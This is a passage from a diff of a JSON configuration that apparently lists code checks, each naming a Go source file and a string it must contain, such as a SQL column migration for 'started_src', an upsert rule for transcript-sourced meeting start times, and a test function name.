+     "contains": "`ALTER TABLE meetings ADD COLUMN started_src TEXT NOT NULL DEFAULT ''`",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/rest_hydrate.go",
+     "contains": "WHEN excluded.started_src = 'transcript' AND (COALESCE(meetings.started_at, '') = '' OR meetings.started_src = 'transcript') THEN excluded.started_at",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/codex_pr_review_fixes_test.go",
+     "contains": "func TestPartialResponseKeepsTheScheduledWindow(",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  }
+ ]
+}
